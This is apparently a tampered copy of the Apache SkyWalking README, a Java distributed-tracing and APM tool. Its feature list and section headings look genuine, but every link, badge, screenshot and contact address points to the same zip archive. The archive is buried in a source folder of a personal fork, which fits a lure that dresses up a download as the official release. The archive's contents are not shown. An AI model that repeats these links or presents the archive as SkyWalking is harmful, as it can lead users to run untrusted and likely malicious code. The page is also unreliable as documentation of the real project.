Apache SkyWalking | [中文](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
==========

<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip" alt="Sky Walking logo" height="90px" align="right" />

**SkyWalking**: APM (application performance monitor) tool for distributed systems, especially designed for 
microservices, cloud native and container-based (Docker, K8s, Mesos) architectures.
Underlying technology is a distributed tracing system.

[![Build Status](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
[![Twitter URL](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
[![Join the chat at https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
[![OpenTracing-1.x Badge](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)

* Provide Java agent, **no need to CHANGE any application source code**.
  * High performance agent. Only increase extra **10%** cpu cost in 5000+ tps application, even **when collect all traces**.
  * [Supported middlewares, frameworks and libraries](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip).
* Manual instrumentation
  * As an [OpenTracing supported tracer](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
  * Use **@Trace** annotation for any methods you want to trace.
  * Integrate traceId into logs for log4j, log4j2 and logback.
* Pure Java server implementation, provide RESTful and gRPC services. Compatibility with other language agents/SDKs. 
* The UI released on [skywalking-ui](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)

# Document
[![EN doc](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip) [![cn doc](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip文档-中文版https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)

# 5.x Architecture
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

# Code of conduct
This project adheres to the Contributor Covenant [code of conduct](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip). By participating, you are expected to uphold this code. Please report unacceptable behavior to https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip

# Screenshots
- Discovery topological graph of application clusters automatically.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

- Trace query.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

- Span detail.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip" />

- Instance Overview.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

- JVM Detail.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

- Services Dependency Tree.
<img src="https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip"/>

# Test reports
- Automatic integration test reports
  - [Java Agent test report](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
- Performance test reports
  - [Java Agent test report](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)

# Contact Us
* Submit an issue
* [Gitter](https://raw.githubusercontent.com/tanglongwei/incubator-skywalking/master/apm-collector/apm-collector-agent/agent-grpc/agent-grpc-provider/src/main/java/org/apache/skywalking/apm/collector/incubator_skywalking_v1.0.zip)
* QQ Group: 392443393

# License
[Apache 2.0 License.](/LICENSE)
